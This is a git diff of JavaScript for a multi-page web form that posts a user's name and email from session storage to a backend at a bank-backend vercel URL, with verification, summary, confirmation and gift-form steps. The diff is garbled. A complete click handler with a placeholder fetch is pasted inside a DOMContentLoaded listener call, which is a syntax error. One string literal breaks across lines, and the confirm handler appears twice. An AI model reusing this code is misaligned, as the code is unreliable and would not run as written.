@@ -47,19 +47,22 @@ function goToPage(page) {
 
 // Form submission handler
 document.getElementById('verificationForm').addEventListener('submit', function (e) {
-  e.preventDefault();
+    e.preventDefault();
 
-  // Collect form data
-  const formData = new FormData(this);
+    // Collect form data
+    const formData = new FormData(this);
 
-  // Debugging: Log form data to the console
-  for (let [key, value] of formData.entries()) {
-    console.log(`${key}: ${value}`);
-  }
+    // Debugging: Log form data to the console
+    for (let [key, value] of formData.entries()) {
+        console.log(`${key}: ${value}`);
+    }
 
-  // Redirect to the next page
-  window.location.href = 'page5.html';
+    // Add form validation here (if needed)
+
+    // Proceed to the next page
+    window.location.href = 'page5.html';
 });
+
 // Mock data from the previous pages (in a real app, this would come from session or backend)
 const mockFormData = {
   fullName: "John Doe",
@@ -83,16 +86,53 @@ function populateSummary() {
 }
 
 // Call populateSummary when the page loads
-document.addEventListener("DOMContentLoaded", populateSummary);
+document.addEventListener("DOMContentLoaded"document.getElementById("confirmButton").addEventListener("click", function () {
+    // Send the real data to the backend
+    fetch("https://your-backend-endpoint.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            fullName: sessionStorage.getItem("fullName"),
+            email: sessionStorage.getItem("email"),
+            // Add other fields as needed
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Data sent to backend:", data);
+        alert("Your account has been successfully created!");
+        window.location.href = "success.html";
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("There was an error. Please try
+ again later.");
+    });
+}); populateSummary);
 
 // Confirm button click handler
-document.getElementById("confirmButton").addEventListener("click", function () {
-  // Simulate sending data to the backend
-  console.log("Data sent to backend:", mockFormData);
 
-  // Notify the user and redirect
-  alert("Your account has been successfully created!");
-  window.location.href = "success.html";
+document.getElementById("confirmButton").addEventListener("click", function () {
+    // Send the real data to the backend
+    fetch("https://bank-backend-gold.vercel.app", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            fullName: sessionStorage.getItem("fullName"),
+            email: sessionStorage.getItem("email"),
+            // Add other fields as needed
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Data sent to backend:", data);
+        alert("Your account has been successfully created!");
+        window.location.href = "success.html";
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("There was an error. Please try again later.");
+    });
 });
 
 document.getElementById("giftForm").addEventListener("submit", function (e) {
